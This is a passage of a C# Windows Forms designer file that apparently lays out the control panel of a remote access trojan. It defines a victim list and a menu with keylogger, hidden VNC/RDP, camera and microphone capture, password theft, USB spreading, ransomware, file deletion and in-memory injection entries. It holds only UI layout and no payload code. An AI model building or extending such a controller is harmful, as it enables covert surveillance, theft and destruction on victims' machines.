        this.ClientsList.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        this.ClientsList.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ClientsList.Size = new System.Drawing.Size(926, 378);
        this.ClientsList.TabIndex = 485;
        this.ClientsList.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.LightGrid;
        this.ClientsList.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
        this.ClientsList.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ClientsList.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ClientsList.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ClientsList.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ClientsList.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ClientsList.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        this.ClientsList.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        this.ClientsList.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ClientsList.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ClientsList.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ClientsList.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ClientsList.ThemeStyle.HeaderStyle.Height = 30;
        this.ClientsList.ThemeStyle.ReadOnly = true;
        this.ClientsList.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ClientsList.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ClientsList.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ClientsList.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ClientsList.ThemeStyle.RowsStyle.Height = 22;
        this.ClientsList.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        this.ClientsList.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.Black;
        // 
        // CLogo
        // 
        this.CLogo.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle14.NullValue = null;
        dataGridViewCellStyle14.Padding = new System.Windows.Forms.Padding(4);
        this.CLogo.DefaultCellStyle = dataGridViewCellStyle14;
        this.CLogo.HeaderText = "Logo    ";
        this.CLogo.Name = "CLogo";
        this.CLogo.ReadOnly = true;
        this.CLogo.Width = 60;
        // 
        // CNickname
        // 
        this.CNickname.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CNickname.HeaderText = "Nickname";
        this.CNickname.Name = "CNickname";
        this.CNickname.ReadOnly = true;
        this.CNickname.Width = 92;
        // 
        // CID
        // 
        this.CID.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CID.HeaderText = "ID";
        this.CID.Name = "CID";
        this.CID.ReadOnly = true;
        this.CID.Width = 46;
        // 
        // CIP
        // 
        this.CIP.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CIP.HeaderText = "IP";
        this.CIP.Name = "CIP";
        this.CIP.ReadOnly = true;
        this.CIP.Width = 44;
        // 
        // CPort
        // 
        this.CPort.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CPort.HeaderText = "Port";
        this.CPort.Name = "CPort";
        this.CPort.ReadOnly = true;
        this.CPort.Width = 57;
        // 
        // CFlag
        // 
        this.CFlag.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle15.NullValue = null;
        dataGridViewCellStyle15.Padding = new System.Windows.Forms.Padding(3);
        this.CFlag.DefaultCellStyle = dataGridViewCellStyle15;
        this.CFlag.HeaderText = "Flag     ";
        this.CFlag.Name = "CFlag";
        this.CFlag.ReadOnly = true;
        this.CFlag.Width = 58;
        // 
        // CCountry
        // 
        this.CCountry.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CCountry.HeaderText = "Country";
        this.CCountry.Name = "CCountry";
        this.CCountry.ReadOnly = true;
        this.CCountry.Width = 82;
        // 
        // CUsername
        // 
        this.CUsername.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CUsername.HeaderText = "Username";
        this.CUsername.Name = "CUsername";
        this.CUsername.ReadOnly = true;
        this.CUsername.Width = 94;
        // 
        // CAdmin
        // 
        this.CAdmin.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CAdmin.HeaderText = "Admin";
        this.CAdmin.Name = "CAdmin";
        this.CAdmin.ReadOnly = true;
        this.CAdmin.Resizable = System.Windows.Forms.DataGridViewTriState.True;
        this.CAdmin.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Automatic;
        this.CAdmin.Width = 72;
        // 
        // CSystem
        // 
        this.CSystem.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CSystem.HeaderText = "System";
        this.CSystem.Name = "CSystem";
        this.CSystem.ReadOnly = true;
        this.CSystem.Width = 76;
        // 
        // CDate
        // 
        this.CDate.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle16.Format = "G";
        dataGridViewCellStyle16.NullValue = null;
        this.CDate.DefaultCellStyle = dataGridViewCellStyle16;
        this.CDate.HeaderText = "Date";
        this.CDate.Name = "CDate";
        this.CDate.ReadOnly = true;
        this.CDate.Width = 61;
        // 
        // Column1
        // 
        this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column1.HeaderText = "Bugged";
        this.Column1.Name = "Column1";
        this.Column1.ReadOnly = true;
        this.Column1.Width = 79;
        // 
        // CVersion
        // 
        this.CVersion.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CVersion.HeaderText = "Version";
        this.CVersion.Name = "CVersion";
        this.CVersion.ReadOnly = true;
        this.CVersion.Width = 77;
        // 
        // CPing
        // 
        this.CPing.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.CPing.HeaderText = "Png";
        this.CPing.Name = "CPing";
        this.CPing.ReadOnly = true;
        this.CPing.Width = 56;
        // 
        // CActive
        // 
        this.CActive.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
        this.CActive.HeaderText = "Active";
        this.CActive.Name = "CActive";
        this.CActive.ReadOnly = true;
        this.CActive.Width = 166;
        // 
        // ContexClients
        // 
        this.ContexClients.BackColor = System.Drawing.Color.White;
        this.ContexClients.ImageScalingSize = new System.Drawing.Size(18, 18);
        this.ContexClients.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ManagerContex,
            this.toolStripSeparator1,
            this.RemoteDesktopContex,
            this.RemoteWindowsActiveContex,
            this.RemoteMicrophoneContex,
            this.RemoteKeyloaggerContex,
            this.RemoteCameraContex,
            this.RemoteChatContex,
            this.toolStripSeparator2,
            this.HiddenApplactionsContex,
            this.HiddenBrowserContex,
            this.HiddenRDPContex,
            this.HiddenVNCContex,
            this.toolStripSeparator3,
            this.ReverseProxyContex,
            this.InternetSpeedContex,
            this.toolStripSeparator4,
            this.PasswordsContex,
            this.MonitorsContex,
            this.systemToolStripMenuItem,
            this.OptionsContex,
            this.extraToolStripMenuItem1,
            this.toolStripSeparator5,
            this.clientToolStripMenuItem1,
            this.sendFileToolStripMenuItem,
            this.folderToolStripMenuItem});
        this.ContexClients.Name = "ContexClients";
        this.ContexClients.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
        this.ContexClients.Size = new System.Drawing.Size(206, 538);
        // 
        // ManagerContex
        // 
        this.ManagerContex.Image = ((System.Drawing.Image)(resources.GetObject("ManagerContex.Image")));
        this.ManagerContex.Name = "ManagerContex";
        this.ManagerContex.Size = new System.Drawing.Size(205, 24);
        this.ManagerContex.Text = "Manager";
        this.ManagerContex.Click += new System.EventHandler(this.ManagerContex_Click);
        // 
        // toolStripSeparator1
        // 
        this.toolStripSeparator1.Name = "toolStripSeparator1";
        this.toolStripSeparator1.Size = new System.Drawing.Size(202, 6);
        // 
        // RemoteDesktopContex
        // 
        this.RemoteDesktopContex.Image = ((System.Drawing.Image)(resources.GetObject("RemoteDesktopContex.Image")));
        this.RemoteDesktopContex.Name = "RemoteDesktopContex";
        this.RemoteDesktopContex.Size = new System.Drawing.Size(205, 24);
        this.RemoteDesktopContex.Text = "Remote Desktop";
        this.RemoteDesktopContex.Click += new System.EventHandler(this.RemoteDesktopContex_Click);
        // 
        // RemoteWindowsActiveContex
        // 
        this.RemoteWindowsActiveContex.Image = ((System.Drawing.Image)(resources.GetObject("RemoteWindowsActiveContex.Image")));
        this.RemoteWindowsActiveContex.Name = "RemoteWindowsActiveContex";
        this.RemoteWindowsActiveContex.Size = new System.Drawing.Size(205, 24);
        this.RemoteWindowsActiveContex.Text = "Remote Windows Active";
        this.RemoteWindowsActiveContex.Click += new System.EventHandler(this.RemoteWindowsActiveContex_Click);
        // 
        // RemoteMicrophoneContex
        // 
        this.RemoteMicrophoneContex.Image = ((System.Drawing.Image)(resources.GetObject("RemoteMicrophoneContex.Image")));
        this.RemoteMicrophoneContex.Name = "RemoteMicrophoneContex";
        this.RemoteMicrophoneContex.Size = new System.Drawing.Size(205, 24);
        this.RemoteMicrophoneContex.Text = "Remote Microphone";
        this.RemoteMicrophoneContex.Click += new System.EventHandler(this.RemoteMicrophoneContex_Click);
        // 
        // RemoteKeyloaggerContex
        // 
        this.RemoteKeyloaggerContex.Image = ((System.Drawing.Image)(resources.GetObject("RemoteKeyloaggerContex.Image")));
        this.RemoteKeyloaggerContex.Name = "RemoteKeyloaggerContex";
        this.RemoteKeyloaggerContex.Size = new System.Drawing.Size(205, 24);
        this.RemoteKeyloaggerContex.Text = "Remote Keyloagger";
        this.RemoteKeyloaggerContex.Click += new System.EventHandler(this.RemoteKeyloaggerContex_Click);
        // 
        // RemoteCameraContex
        // 
        this.RemoteCameraContex.Image = ((System.Drawing.Image)(resources.GetObject("RemoteCameraContex.Image")));
        this.RemoteCameraContex.Name = "RemoteCameraContex";
        this.RemoteCameraContex.Size = new System.Drawing.Size(205, 24);
        this.RemoteCameraContex.Text = "Remote Camera";
        this.RemoteCameraContex.Click += new System.EventHandler(this.RemoteCameraContex_Click);
        // 
        // RemoteChatContex
        // 
        this.RemoteChatContex.Image = ((System.Drawing.Image)(resources.GetObject("RemoteChatContex.Image")));
        this.RemoteChatContex.Name = "RemoteChatContex";
        this.RemoteChatContex.Size = new System.Drawing.Size(205, 24);
        this.RemoteChatContex.Text = "Remote Chat";
        this.RemoteChatContex.Click += new System.EventHandler(this.RemoteChatContex_Click);
        // 
        // toolStripSeparator2
        // 
        this.toolStripSeparator2.Name = "toolStripSeparator2";
        this.toolStripSeparator2.Size = new System.Drawing.Size(202, 6);
        // 
        // HiddenApplactionsContex
        // 
        this.HiddenApplactionsContex.Image = ((System.Drawing.Image)(resources.GetObject("HiddenApplactionsContex.Image")));
        this.HiddenApplactionsContex.Name = "HiddenApplactionsContex";
        this.HiddenApplactionsContex.Size = new System.Drawing.Size(205, 24);
        this.HiddenApplactionsContex.Text = "Hidden Applactions";
        this.HiddenApplactionsContex.Click += new System.EventHandler(this.HiddenApplactionsContex_Click);
        // 
        // HiddenBrowserContex
        // 
        this.HiddenBrowserContex.Image = ((System.Drawing.Image)(resources.GetObject("HiddenBrowserContex.Image")));
        this.HiddenBrowserContex.Name = "HiddenBrowserContex";
        this.HiddenBrowserContex.Size = new System.Drawing.Size(205, 24);
        this.HiddenBrowserContex.Text = "Hidden Browser";
        this.HiddenBrowserContex.Click += new System.EventHandler(this.HiddenBrowserContex_Click);
        // 
        // HiddenRDPContex
        // 
        this.HiddenRDPContex.Image = ((System.Drawing.Image)(resources.GetObject("HiddenRDPContex.Image")));
        this.HiddenRDPContex.Name = "HiddenRDPContex";
        this.HiddenRDPContex.Size = new System.Drawing.Size(205, 24);
        this.HiddenRDPContex.Text = "Hidden RDP";
        this.HiddenRDPContex.Click += new System.EventHandler(this.HiddenRDPContex_Click);
        // 
        // HiddenVNCContex
        // 
        this.HiddenVNCContex.Image = ((System.Drawing.Image)(resources.GetObject("HiddenVNCContex.Image")));
        this.HiddenVNCContex.Name = "HiddenVNCContex";
        this.HiddenVNCContex.Size = new System.Drawing.Size(205, 24);
        this.HiddenVNCContex.Text = "Hidden Vnc";
        this.HiddenVNCContex.Click += new System.EventHandler(this.HiddenVNCContex_Click);
        // 
        // toolStripSeparator3
        // 
        this.toolStripSeparator3.Name = "toolStripSeparator3";
        this.toolStripSeparator3.Size = new System.Drawing.Size(202, 6);
        // 
        // ReverseProxyContex
        // 
        this.ReverseProxyContex.Image = ((System.Drawing.Image)(resources.GetObject("ReverseProxyContex.Image")));
        this.ReverseProxyContex.Name = "ReverseProxyContex";
        this.ReverseProxyContex.Size = new System.Drawing.Size(205, 24);
        this.ReverseProxyContex.Text = "Reverse Proxy ";
        this.ReverseProxyContex.Click += new System.EventHandler(this.ReverseProxyContex_Click);
        // 
        // InternetSpeedContex
        // 
        this.InternetSpeedContex.Image = ((System.Drawing.Image)(resources.GetObject("InternetSpeedContex.Image")));
        this.InternetSpeedContex.Name = "InternetSpeedContex";
        this.InternetSpeedContex.Size = new System.Drawing.Size(205, 24);
        this.InternetSpeedContex.Text = "Internet Speed";
        this.InternetSpeedContex.Click += new System.EventHandler(this.InternetSpeedContex_Click);
        // 
        // toolStripSeparator4
        // 
        this.toolStripSeparator4.Name = "toolStripSeparator4";
        this.toolStripSeparator4.Size = new System.Drawing.Size(202, 6);
        // 
        // PasswordsContex
        // 
        this.PasswordsContex.Image = ((System.Drawing.Image)(resources.GetObject("PasswordsContex.Image")));
        this.PasswordsContex.Name = "PasswordsContex";
        this.PasswordsContex.Size = new System.Drawing.Size(205, 24);
        this.PasswordsContex.Text = "Passwords && Data";
        this.PasswordsContex.Click += new System.EventHandler(this.PasswordsContex_Click);
        // 
        // MonitorsContex
        // 
        this.MonitorsContex.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.MonitorStartContex,
            this.MonitorStopContex});
        this.MonitorsContex.Image = ((System.Drawing.Image)(resources.GetObject("MonitorsContex.Image")));
        this.MonitorsContex.Name = "MonitorsContex";
        this.MonitorsContex.Size = new System.Drawing.Size(205, 24);
        this.MonitorsContex.Text = "Monitor";
        // 
        // MonitorStartContex
        // 
        this.MonitorStartContex.Image = ((System.Drawing.Image)(resources.GetObject("MonitorStartContex.Image")));
        this.MonitorStartContex.Name = "MonitorStartContex";
        this.MonitorStartContex.Size = new System.Drawing.Size(98, 22);
        this.MonitorStartContex.Text = "Start";
        this.MonitorStartContex.Click += new System.EventHandler(this.MonitorStartContex_Click);
        // 
        // MonitorStopContex
        // 
        this.MonitorStopContex.Image = ((System.Drawing.Image)(resources.GetObject("MonitorStopContex.Image")));
        this.MonitorStopContex.Name = "MonitorStopContex";
        this.MonitorStopContex.Size = new System.Drawing.Size(98, 22);
        this.MonitorStopContex.Text = "Stop";
        this.MonitorStopContex.Click += new System.EventHandler(this.MonitorStopContex_Click);
        // 
        // systemToolStripMenuItem
        // 
        this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.SystemHangContex,
            this.SystemLogoffContex,
            this.SystemRestartContex,
            this.SystemShutdownContex});
        this.systemToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemToolStripMenuItem.Image")));
        this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
        this.systemToolStripMenuItem.Size = new System.Drawing.Size(205, 24);
        this.systemToolStripMenuItem.Text = "System";
        // 
        // SystemHangContex
        // 
        this.SystemHangContex.Image = ((System.Drawing.Image)(resources.GetObject("SystemHangContex.Image")));
        this.SystemHangContex.Name = "SystemHangContex";
        this.SystemHangContex.Size = new System.Drawing.Size(128, 22);
        this.SystemHangContex.Text = "Hang";
        this.SystemHangContex.Click += new System.EventHandler(this.SystemHangContex_Click);
        // 
        // SystemLogoffContex
        // 
        this.SystemLogoffContex.Image = ((System.Drawing.Image)(resources.GetObject("SystemLogoffContex.Image")));
        this.SystemLogoffContex.Name = "SystemLogoffContex";
        this.SystemLogoffContex.Size = new System.Drawing.Size(128, 22);
        this.SystemLogoffContex.Text = "Sign Out";
        this.SystemLogoffContex.Click += new System.EventHandler(this.SystemLogoffContex_Click);
        // 
        // SystemRestartContex
        // 
        this.SystemRestartContex.Image = ((System.Drawing.Image)(resources.GetObject("SystemRestartContex.Image")));
        this.SystemRestartContex.Name = "SystemRestartContex";
        this.SystemRestartContex.Size = new System.Drawing.Size(128, 22);
        this.SystemRestartContex.Text = "Restart";
        this.SystemRestartContex.Click += new System.EventHandler(this.SystemRestartContex_Click);
        // 
        // SystemShutdownContex
        // 
        this.SystemShutdownContex.Image = ((System.Drawing.Image)(resources.GetObject("SystemShutdownContex.Image")));
        this.SystemShutdownContex.Name = "SystemShutdownContex";
        this.SystemShutdownContex.Size = new System.Drawing.Size(128, 22);
        this.SystemShutdownContex.Text = "Shutdown";
        this.SystemShutdownContex.Click += new System.EventHandler(this.SystemShutdownContex_Click);
        // 
        // OptionsContex
        // 
        this.OptionsContex.Image = ((System.Drawing.Image)(resources.GetObject("OptionsContex.Image")));
        this.OptionsContex.Name = "OptionsContex";
        this.OptionsContex.Size = new System.Drawing.Size(205, 24);
        this.OptionsContex.Text = "Options";
        this.OptionsContex.Click += new System.EventHandler(this.OptionsContex_Click);
        // 
        // extraToolStripMenuItem1
        // 
        this.extraToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.USBSpreadContex,
            this.RansomwareContex,
            this.DeleteAllFilesContex,
            this.DeleteCookiesContex,
            this.DeleteSystemRestoreContex,
            this.VisitWebsiteContex});
        this.extraToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("extraToolStripMenuItem1.Image")));
        this.extraToolStripMenuItem1.Name = "extraToolStripMenuItem1";
        this.extraToolStripMenuItem1.Size = new System.Drawing.Size(205, 24);
        this.extraToolStripMenuItem1.Text = "Extra";
        // 
        // USBSpreadContex
        // 
        this.USBSpreadContex.Image = ((System.Drawing.Image)(resources.GetObject("USBSpreadContex.Image")));
        this.USBSpreadContex.Name = "USBSpreadContex";
        this.USBSpreadContex.Size = new System.Drawing.Size(188, 22);
        this.USBSpreadContex.Text = "USB Spread";
        this.USBSpreadContex.Click += new System.EventHandler(this.USBSpreadContex_Click);
        // 
        // RansomwareContex
        // 
        this.RansomwareContex.Image = ((System.Drawing.Image)(resources.GetObject("RansomwareContex.Image")));
        this.RansomwareContex.Name = "RansomwareContex";
        this.RansomwareContex.Size = new System.Drawing.Size(188, 22);
        this.RansomwareContex.Text = "Ransomware";
        this.RansomwareContex.Click += new System.EventHandler(this.RansomwareContex_Click);
        // 
        // DeleteAllFilesContex
        // 
        this.DeleteAllFilesContex.Image = ((System.Drawing.Image)(resources.GetObject("DeleteAllFilesContex.Image")));
        this.DeleteAllFilesContex.Name = "DeleteAllFilesContex";
        this.DeleteAllFilesContex.Size = new System.Drawing.Size(188, 22);
        this.DeleteAllFilesContex.Text = "Delete All Files";
        this.DeleteAllFilesContex.Click += new System.EventHandler(this.DeleteAllFilesContex_Click);
        // 
        // DeleteCookiesContex
        // 
        this.DeleteCookiesContex.Image = ((System.Drawing.Image)(resources.GetObject("DeleteCookiesContex.Image")));
        this.DeleteCookiesContex.Name = "DeleteCookiesContex";
        this.DeleteCookiesContex.Size = new System.Drawing.Size(188, 22);
        this.DeleteCookiesContex.Text = "Delete Cookies";
        this.DeleteCookiesContex.Click += new System.EventHandler(this.DeleteCookiesContex_Click);
        // 
        // DeleteSystemRestoreContex
        // 
        this.DeleteSystemRestoreContex.Image = ((System.Drawing.Image)(resources.GetObject("DeleteSystemRestoreContex.Image")));
        this.DeleteSystemRestoreContex.Name = "DeleteSystemRestoreContex";
        this.DeleteSystemRestoreContex.Size = new System.Drawing.Size(188, 22);
        this.DeleteSystemRestoreContex.Text = "Delete  Restore Points";
        this.DeleteSystemRestoreContex.Click += new System.EventHandler(this.DeleteSystemRestoreContex_Click);
        // 
        // VisitWebsiteContex
        // 
        this.VisitWebsiteContex.Image = ((System.Drawing.Image)(resources.GetObject("VisitWebsiteContex.Image")));
        this.VisitWebsiteContex.Name = "VisitWebsiteContex";
        this.VisitWebsiteContex.Size = new System.Drawing.Size(188, 22);
        this.VisitWebsiteContex.Text = "Visit Website";
        this.VisitWebsiteContex.Click += new System.EventHandler(this.VisitWebsiteContex_Click);
        // 
        // toolStripSeparator5
        // 
        this.toolStripSeparator5.Name = "toolStripSeparator5";
        this.toolStripSeparator5.Size = new System.Drawing.Size(202, 6);
        // 
        // clientToolStripMenuItem1
        // 
        this.clientToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ChagneLogoClientContex,
            this.RenameClientContex,
            this.UpdateClientContex,
            this.RestartClientContex,
            this.CloseClientContex,
            this.UnistallClientContex});
        this.clientToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("clientToolStripMenuItem1.Image")));
        this.clientToolStripMenuItem1.Name = "clientToolStripMenuItem1";
        this.clientToolStripMenuItem1.Size = new System.Drawing.Size(205, 24);
        this.clientToolStripMenuItem1.Text = "Client";
        // 
        // ChagneLogoClientContex
        // 
        this.ChagneLogoClientContex.Image = ((System.Drawing.Image)(resources.GetObject("ChagneLogoClientContex.Image")));
        this.ChagneLogoClientContex.Name = "ChagneLogoClientContex";
        this.ChagneLogoClientContex.Size = new System.Drawing.Size(145, 22);
        this.ChagneLogoClientContex.Text = "Change Logo";
        this.ChagneLogoClientContex.Click += new System.EventHandler(this.ChagneLogoClientContex_Click);
        // 
        // RenameClientContex
        // 
        this.RenameClientContex.Image = ((System.Drawing.Image)(resources.GetObject("RenameClientContex.Image")));
        this.RenameClientContex.Name = "RenameClientContex";
        this.RenameClientContex.Size = new System.Drawing.Size(145, 22);
        this.RenameClientContex.Text = "Rename";
        this.RenameClientContex.Click += new System.EventHandler(this.RenameClientContex_Click);
        // 
        // UpdateClientContex
        // 
        this.UpdateClientContex.Image = ((System.Drawing.Image)(resources.GetObject("UpdateClientContex.Image")));
        this.UpdateClientContex.Name = "UpdateClientContex";
        this.UpdateClientContex.Size = new System.Drawing.Size(145, 22);
        this.UpdateClientContex.Text = "Update";
        this.UpdateClientContex.Click += new System.EventHandler(this.UpdateClientContex_Click);
        // 
        // RestartClientContex
        // 
        this.RestartClientContex.Image = ((System.Drawing.Image)(resources.GetObject("RestartClientContex.Image")));
        this.RestartClientContex.Name = "RestartClientContex";
        this.RestartClientContex.Size = new System.Drawing.Size(145, 22);
        this.RestartClientContex.Text = "Restart";
        this.RestartClientContex.Click += new System.EventHandler(this.RestartClientContex_Click);
        // 
        // CloseClientContex
        // 
        this.CloseClientContex.Image = ((System.Drawing.Image)(resources.GetObject("CloseClientContex.Image")));
        this.CloseClientContex.Name = "CloseClientContex";
        this.CloseClientContex.Size = new System.Drawing.Size(145, 22);
        this.CloseClientContex.Text = "Close";
        this.CloseClientContex.Click += new System.EventHandler(this.CloseClientContex_Click);
        // 
        // UnistallClientContex
        // 
        this.UnistallClientContex.Image = ((System.Drawing.Image)(resources.GetObject("UnistallClientContex.Image")));
        this.UnistallClientContex.Name = "UnistallClientContex";
        this.UnistallClientContex.Size = new System.Drawing.Size(145, 22);
        this.UnistallClientContex.Text = "Unistall";
        this.UnistallClientContex.Click += new System.EventHandler(this.UnistallClientContex_Click);
        // 
        // sendFileToolStripMenuItem
        // 
        this.sendFileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.SendFileToDiskContex,
            this.toolStripMenuItem_0,
            this.SendFileFromURLContex,
            this.SendFileToMemoryContex});
        this.sendFileToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("sendFileToolStripMenuItem.Image")));
        this.sendFileToolStripMenuItem.Name = "sendFileToolStripMenuItem";
        this.sendFileToolStripMenuItem.Size = new System.Drawing.Size(205, 24);
        this.sendFileToolStripMenuItem.Text = "Send File";
        // 
        // SendFileToDiskContex
        // 
        this.SendFileToDiskContex.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToDiskContex.Image")));
        this.SendFileToDiskContex.Name = "SendFileToDiskContex";
        this.SendFileToDiskContex.Size = new System.Drawing.Size(134, 22);
        this.SendFileToDiskContex.Text = "To Disk";
        this.SendFileToDiskContex.Click += new System.EventHandler(this.SendFileToDiskContex_Click);
        // 
        // toolStripMenuItem_0
        // 
        this.toolStripMenuItem_0.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem_0.Image")));
        this.toolStripMenuItem_0.Name = "toolStripMenuItem_0";
        this.toolStripMenuItem_0.Size = new System.Drawing.Size(134, 22);
        this.toolStripMenuItem_0.Text = "Injection";
        this.toolStripMenuItem_0.Click += new System.EventHandler(this.SendFileRunPEContex_Click);
        // 
        // SendFileFromURLContex
        // 
        this.SendFileFromURLContex.Image = ((System.Drawing.Image)(resources.GetObject("SendFileFromURLContex.Image")));
        this.SendFileFromURLContex.Name = "SendFileFromURLContex";
        this.SendFileFromURLContex.Size = new System.Drawing.Size(134, 22);
        this.SendFileFromURLContex.Text = "From Url";
        this.SendFileFromURLContex.Click += new System.EventHandler(this.SendFileFromURLContex_Click);
        // 
        // SendFileToMemoryContex
        // 
        this.SendFileToMemoryContex.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToMemoryContex.Image")));
        this.SendFileToMemoryContex.Name = "SendFileToMemoryContex";
        this.SendFileToMemoryContex.Size = new System.Drawing.Size(134, 22);
        this.SendFileToMemoryContex.Text = "To Meomry";
        this.SendFileToMemoryContex.Click += new System.EventHandler(this.SendFileToMemoryContex_Click);
        // 
        // folderToolStripMenuItem
        // 
        this.folderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.OpenFolderDownloads,
            this.OpenFolderPasswords,
            this.OpenFolderKeyloagger});
        this.folderToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("folderToolStripMenuItem.Image")));
        this.folderToolStripMenuItem.Name = "folderToolStripMenuItem";
        this.folderToolStripMenuItem.Size = new System.Drawing.Size(205, 24);
        this.folderToolStripMenuItem.Text = "Open Folder";
        // 
        // OpenFolderDownloads
        // 
        this.OpenFolderDownloads.Image = ((System.Drawing.Image)(resources.GetObject("OpenFolderDownloads.Image")));
        this.OpenFolderDownloads.Name = "OpenFolderDownloads";
        this.OpenFolderDownloads.Size = new System.Drawing.Size(133, 22);
        this.OpenFolderDownloads.Text = "Downloads";
        this.OpenFolderDownloads.Click += new System.EventHandler(this.OpenFolderDownloads_Click);
        // 
        // OpenFolderPasswords
        // 
        this.OpenFolderPasswords.Image = ((System.Drawing.Image)(resources.GetObject("OpenFolderPasswords.Image")));
        this.OpenFolderPasswords.Name = "OpenFolderPasswords";
        this.OpenFolderPasswords.Size = new System.Drawing.Size(133, 22);
        this.OpenFolderPasswords.Text = "Passwords";
        this.OpenFolderPasswords.Click += new System.EventHandler(this.OpenFolderPasswords_Click);
        // 
        // OpenFolderKeyloagger
        // 
        this.OpenFolderKeyloagger.Image = ((System.Drawing.Image)(resources.GetObject("OpenFolderKeyloagger.Image")));
        this.OpenFolderKeyloagger.Name = "OpenFolderKeyloagger";
        this.OpenFolderKeyloagger.Size = new System.Drawing.Size(133, 22);
        this.OpenFolderKeyloagger.Text = "Keyloagger";
        this.OpenFolderKeyloagger.Click += new System.EventHandler(this.OpenFolderKeyloagger_Click);
        // 
        // Page4
        // 
        this.Page4.BackColor = System.Drawing.Color.White;
        this.Page4.Controls.Add(this.PanelLogs);
        this.Page4.Location = new System.Drawing.Point(4, 4);
        this.Page4.Name = "Page4";
        this.Page4.Size = new System.Drawing.Size(944, 487);
        this.Page4.TabIndex = 3;
        this.Page4.Text = "PageLogs";
        // 
        // PanelLogs
        // 
        this.PanelLogs.Controls.Add(this.bunifuShadowPanel5);
        this.PanelLogs.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelLogs.Location = new System.Drawing.Point(0, 0);
        this.PanelLogs.Name = "PanelLogs";
        this.PanelLogs.Size = new System.Drawing.Size(944, 487);
        this.PanelLogs.TabIndex = 1;
        this.PanelLogs.Visible = false;
        // 
        // bunifuShadowPanel5
        // 
        this.bunifuShadowPanel5.BackColor = System.Drawing.Color.White;
        this.bunifuShadowPanel5.BorderColor = System.Drawing.Color.White;
        this.bunifuShadowPanel5.BorderRadius = 20;
        this.bunifuShadowPanel5.BorderThickness = 1;
        this.bunifuShadowPanel5.Controls.Add(this.ClearListLogs);
